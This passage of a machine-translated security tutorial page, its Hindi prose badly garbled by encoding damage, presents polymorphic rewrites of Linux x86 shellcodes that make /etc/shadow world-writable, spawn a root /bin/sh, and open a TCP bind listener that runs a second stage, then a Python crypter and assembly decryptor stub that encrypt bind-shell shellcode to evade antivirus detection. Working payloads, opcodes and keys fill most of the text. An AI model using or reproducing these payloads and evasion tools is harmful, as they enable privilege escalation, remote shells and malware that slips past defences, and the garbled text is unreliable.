<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. рд╢реЗрд▓-рддреВрдлрд╛рди рд╕реЗ 3 рд╢реЗрд▓рдХреЛрдб рдХреЗ рдмрд╣реБрд░реВрдкреА рд░реВрдкрд╛рдВрддрд░рдг рдХрд░реЗрдВред</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдПрдХ рдмрд╣реБрд░реВрдкреА рдкрд░рд┐рд╡рд░реНрддрди рдПрдХ рдкрд░рд┐рд╡рд░реНрддрди рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдХреЛрдб рдмрджрд▓рддрд╛ рд╣реИ рдФрд░ рддрд░реНрдХ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдЙрджрд╛рд╣рд░рдг: </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
xor eax, eax рд░рдЬрд┐рд╕реНрдЯрд░реЛрдВ рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░реЗрдЧрд╛, </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╕рдм eax, eax рд░рдЬрд┐рд╕реНрдЯрд░реЛрдВ рдХреЛ рднреА рд░реАрд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкреНрд░рджрд░реНрд╢рди рдореЗрдВ рджреЛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдореЗрдВ рдЕрдВрддрд░ рд╣реЛрдЧрд╛: рдкрд╣рд▓рд╛ рдереЛрдбрд╝рд╛ рддреЗрдЬ рдЪрд▓реЗрдЧрд╛ред </font><font style="vertical-align: inherit;">рдкреЙрд▓реАрдореЛрд░реНрдлрд┐рдХ рд░реВрдкрд╛рдВрддрд░рдг рд╢реЗрд▓рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ, рдЬреЛ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. рдЪрд╛рдореЛрдж / рдЖрджрд┐ / рдЫрд╛рдпрд╛</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-608.php<font></font>
	; Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes<font></font>
	; length - 40 bytes<font></font>
	section .text<font></font>
<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub ebx, ebx	; replaced<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	sub eax, eax	; replaced<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣ рд╢реЗрд▓рдХреЛрдб рд╕реИрдЯреБрдЗрдб () рдХреЛ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЗ рд╕рд╛рде 0,0 рдХрд╣рддрд╛ рд╣реИ (рдпрд╣ рд░реВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ) рдФрд░ рдлрд┐рд░ / etc / рдЫрд╛рдпрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП chmod () рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0p/db/mo/0pdbmogrsi4bdn849ylf8hbjbti.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рд░рдЬрд┐рд╕реНрдЯрд░реЛрдВ рдХреЛ рд░реАрд╕реЗрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдЗрд╕ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред</font></font><br>
<br>
<pre><code class="plaintext hljs"><font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	push 0x17	; replaced<font></font>
	pop eax		; replaced<font></font>
	int 0x80<font></font>
	push eax	; on success zero<font></font>
	push 0x776f6461<font></font>
        push 0x68732f63<font></font>
        push 0x74652f2f<font></font>
	mov ebx, esp<font></font>
	mov cl, 0xb6	; replaced<font></font>
	mov ch, 0x1	; replaced<font></font>
        add al, 15	; replaced<font></font>
        int 0x80<font></font>
        add eax, 1	; replaced<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рдХреЛрдб рдХреЛ asm рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ "рдПрдХрддреНрд░" рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ C-рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд╣реАрдВ, рдЗрд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. рдирд┐рд╖реНрдкрд╛рджрд┐рдд / рдмрд┐рди / рд╢</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; http://shell-storm.org/shellcode/files/shellcode-251.php<font></font>
	; (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 37 bytes<font></font>
	; length - 45 byte<font></font>
	section .text<font></font>
global _start<font></font>
_start:<font></font>
	push 0x17<font></font>
	mov eax, [esp]	; replaced<font></font>
	sub ebx, ebx	; replaced<font></font>
	imul edi, ebx	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	push 0x2e<font></font>
	mov eax, [esp]	; replaced<font></font>
	push edi 	; replaced<font></font>
	int 0x80<font></font>
<font></font>
	sub edx, edx	; replaced<font></font>
	push 0xb<font></font>
	pop eax<font></font>
	push edi	; replaced<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
	lea ebx, [esp]	; replaced<font></font>
	push edi	; replaced<font></font>
	push edi	; replaced<font></font>
	lea esp, [ecx]	; replaced<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/9q/cl/-o/9qcl-ol-qznvbz8jckiaheke8i8.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдкрд╣рд▓реЗ рд╣реА рдКрдкрд░ рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдмрд╛рд░ рдорд╛рдирд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдЙрд╕реЗ рд╡рд┐рд╢реЗрд╖ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. рджреВрд╕рд░реЗ рдЪрд░рдг рдХреЗ рд╕рд╛рде TCP рдмрд╛рдЗрдВрдб рд╢реЗрд▓рдХреЛрдб</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; original: http://shell-storm.org/shellcode/files/shellcode-501.php<font></font>
	; linux/x86 listens for shellcode on tcp/5555 and jumps to it 83 bytes<font></font>
	; length 94<font></font>
	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	sub eax, eax	; replaced<font></font>
	imul ebx, eax	; replaced<font></font>
	imul edx, eax	; replaced<font></font>
<font></font>
_socket:<font></font>
	push 0x6<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp] ; replaced<font></font>
	int 0x80<font></font>
<font></font>
_bind:<font></font>
	mov edi, eax	; placing descriptor<font></font>
	push edx<font></font>
	push WORD 0xb315	;/* 5555 */<font></font>
	push WORD 2<font></font>
	lea ecx, [esp]	; replaced<font></font>
	push 16<font></font>
	push ecx<font></font>
	push edi<font></font>
	xor eax, eax	; replaced<font></font>
	add al, 0x66	; replaced<font></font>
	add bl, 1	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_listen:<font></font>
	mov bl, 4	; replaced<font></font>
	push 0x1<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
<font></font>
_accept:<font></font>
	push edx<font></font>
	push edx<font></font>
	push edi<font></font>
	add al, 0x66	; replaced<font></font>
	mov bl, 5	; replaced<font></font>
	lea ecx, [esp]	; replaced<font></font>
	int 0x80<font></font>
	mov ebx, eax<font></font>
<font></font>
_read:<font></font>
	mov al, 0x3<font></font>
	lea ecx, [esp]	; replaced<font></font>
	mov dx, 0x7ff<font></font>
	mov dl, 1	; replaced<font></font>
	int 0x80<font></font>
	jmp esp</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣ рд╢реЗрд▓рдХреЛрдб рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓рддрд╛ рд╣реИ, рд╢реЗрд▓рдХреЛрдб рдХрд╛ рджреВрд╕рд░рд╛ рднрд╛рдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рджреВрд╕рд░реЗ рднрд╛рдЧ рдХрд╛ рдХреЛрдб:</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	mov ebx, 100<font></font>
	int 0x80</code></pre><br>
<img src="https://habrastorage.org/webt/no/zo/n2/nozon26a2dzjtvnngfwkrrz10cc.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╢реЗрд▓рдХреЛрдб рдХрд╛ рджреВрд╕рд░рд╛ рднрд╛рдЧ рд╕рдлрд▓ рд░рд╣рд╛ред </font><font style="vertical-align: inherit;">рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдЧреНрдЬрд┐рдЯ рдХреЛрдб 100 рд╣реИред</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7. рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд░</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рддрдереНрдп рдХреЗ рдмрд╛рд╡рдЬреВрдж рдХрд┐ рдкрд╛рдареНрдпрдХреНрд░рдо рдореЗрдВ, рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЙрдЪреНрдЪ-рд╕реНрддрд░реАрдп рд╕реА рднрд╛рд╖рд╛ рдФрд░ рд╕рд╣рд╛рдпрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдореИрдВрдиреЗ рдЕрд╕реЗрдВрдмрд▓рд░ рдореЗрдВ рдЗрд╕ рдХрд╛рд░реНрдп рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛, </font><font style="vertical-align: inherit;">рдкрд╛рдареНрдпрдХреНрд░рдо рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЗ рд╕рд░рд▓реАрдХрд░рдг рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдХреЛрдбрд╛рдВрддрд░рдХ рдХреЛ рд╕рдорд░реНрдкрд┐рдд рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crypter.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
	print(<span class="hljs-string">"Enter shellcode in hex"</span>)<font></font>
	sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
shellcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
plain_shellcode = bytearray.fromhex(shellcode)<font></font>
<font></font>
<span class="hljs-comment"># Generating key</span><font></font>
key_length = len(plain_shellcode)<font></font>
r = <span class="hljs-string">''</span>.join(chr(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(key_length))<font></font>
key = bytearray(r.encode())<font></font>
<font></font>
encrypted_shellcode = <span class="hljs-string">""</span>
plain_key = <span class="hljs-string">""</span><font></font>
<font></font>
<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(len(plain_shellcode)):<font></font>
	enc_b = (plain_shellcode[b] + key[b]) &amp; <span class="hljs-number">255</span>
	encrypted_shellcode += <span class="hljs-string">'%02x'</span> % enc_b<font></font>
	plain_key += <span class="hljs-string">'0x'</span>+ <span class="hljs-string">'%02x'</span> % key[b] + <span class="hljs-string">','</span><font></font>
<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(encrypted_shellcode)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(plain_key)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(key_length)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ "рдХрдВрдХрд╛рд▓" рдмрдирд╛рдПрдБ:</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	&lt;PUSH ENCRYPTED SHELLCODE&gt;<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, &lt;KEY LENGTH&gt;<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db &lt;CIPHER KEY&gt;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рдХреЛрдб рдХреЗ рд▓рд┐рдП, 3 рдЪреАрдЬреЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ: рдПрдиреНрдХреЛрдбреЗрдб рд╢реЗрд▓рдХреЛрдб, рдХреБрдВрдЬреА рд▓рдВрдмрд╛рдИ рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдкреБрд╢ рдирд┐рд░реНрджреЗрд╢ред </font><font style="vertical-align: inherit;">рд╣рдо TCP рдмрд╛рдЗрдВрдб рд╢реЗрд▓ рд╢реЗрд▓рдХреЛрдб рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВред </font><font style="vertical-align: inherit;">рдУрдкрдХреЛрдб рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$hexopcode bind_tcp_shell <font></font>
31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рдЗрд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВрдЧреЗ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$./crypter.py 31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80<font></font>
*******************************Encrypted shellcode*******************************<font></font>
4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
***********************************KEY*******************************************<font></font>
0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,<font></font>
***********************************KEY LENGTH************************************<font></font>
105</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдорд╛рд░реЗ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдП рдкреБрд╢ рдирд┐рд░реНрджреЗрд╢ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 hex2stack.py 4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
        ...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Asm рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдкреИрд░рд╛рдореАрдЯрд░ рднрд░реЗрдВред</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
	push 0x4cad864b<font></font>
	push 0xbf09ba20<font></font>
	push 0x2c13f1e5<font></font>
	push 0x1e36bff2<font></font>
	push 0x83a47bf3<font></font>
	push 0x76b90c8f<font></font>
	push 0xfa73b77f<font></font>
	push 0x4c55318b<font></font>
	push 0xab3cb9c5<font></font>
	push 0x19874bc0<font></font>
	push 0x750a73dd<font></font>
	push 0x18da4250<font></font>
	push 0xa338c711<font></font>
	push 0xb1491492<font></font>
	push 0x2d398f06<font></font>
	push 0x35c54629<font></font>
	push 0xe1d514c6<font></font>
	push 0x2dfc14c5<font></font>
	push 0xff29aecc<font></font>
	push 0xb4f718cc<font></font>
	push 0xac388f5d<font></font>
	push 0xfb457228<font></font>
	push 0x27b52d90<font></font>
	push 0x2d6378f4<font></font>
	push 0x8df4f24a<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, 105<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db 0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рд╕рдВрдХрд▓рди рдХрд░рддреЗ рд╣реИрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдлрд╛рдЗрд▓ рд╕реЗ рдУрдкрдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$popcode encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣ рд╕рдм shellcode.c рдореЗрдВ рд░рдЦреЗрдВ, рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдПрдВред</font></font><br>
<br>
<img src="https://habrastorage.org/webt/84/t5/5t/84t55tdqgrnbbq9lbdh6_798j6a.png" alt="рдЫрд╡рд┐"><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╕рдВрджрд░реНрдн</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдлрд╛рдЗрд▓реЛрдВ рдФрд░ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд╕рднреА рд▓рд┐рдВрдХ </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдпрд╣рд╛рдВ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рджреЗрдЦреЗ рдЬрд╛ рд╕рдХрддреЗ </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;">рд╣реИрдВред </font></a></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╕реНрд░реЛрддред</font></font></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../hi488404/index.html">2020 рдореЗрдВ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдиреЗ рд▓рд╛рдпрдХ рдЦреЗрд▓</a></li>
<li><a href="../hi488406/index.html">IPv6 - рдЖрдк рдЗрд╕реЗ рдЧрд▓рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ</a></li>
<li><a href="../hi488408/index.html">STM32 рдИрдерд░рдиреЗрдЯ-RS485 IoT рдЧреЗрдЯрд╡реЗ</a></li>
<li><a href="../hi488410/index.html">7 рд╕рдмрдХ рдЬреЛ рдореИрдВрдиреЗ рджрд╕ рд╕рд╛рд▓ рдореЗрдВ рд╡рд┐рдХрд╛рд╕ рдореЗрдВ рд╕реАрдЦреЗ</a></li>
<li><a href="../hi488412/index.html">рдХрд▓рд╣ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдбрд┐рд╕реНрдХ рдмреЙрдЯ рдмрдирд╛рдирд╛</a></li>
<li><a href="../hi488418/index.html">рд╡рд╕рдВрдд рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ MongoDB рдХреЗ рд╕рд╛рде рд░реАрд╕реНрдЯ рдПрдкреАрдЖрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг</a></li>
<li><a href="../hi488422/index.html">рдЖрдкрдХреЗ Vue рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рджрд░реНрдж рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдб рдХреА 10 рд▓рд╛рдЗрдиреЗрдВ</a></li>
<li><a href="../hi488424/index.html">2020 рдореЗрдВ ITSM рдХрд╛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛?</a></li>
<li><a href="../hi488426/index.html">рдХреЛрдб рд╕рдореАрдХреНрд╖рд╛ рдХреИрд╕реЗ рдХрд░реЗрдВ? рднрд╛рдЧ 2: рдиреЗрд╡рд┐рдЧреЗрд╢рди, рдЧрддрд┐, рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ, рд╕рдВрдШрд░реНрд╖реЛрдВ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ</a></li>
<li><a href="../hi488428/index.html">рд╣рдо Yandex рдЦреЛрдЬ рдореЗрдВ рднрд╡рд┐рд╖реНрдп рдХреА рднрд╡рд┐рд╖реНрдпрд╡рд╛рдгреА рдХреИрд╕реЗ рдХрд░рддреЗ рд╣реИрдВ: рдмрдЧ рдлрд┐рдХреНрд╕ рд╕реЗ рд▓реЗрдХрд░ рдЦреЛрдЬ рдХреНрд╡реЗрд░реА рддрдХ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
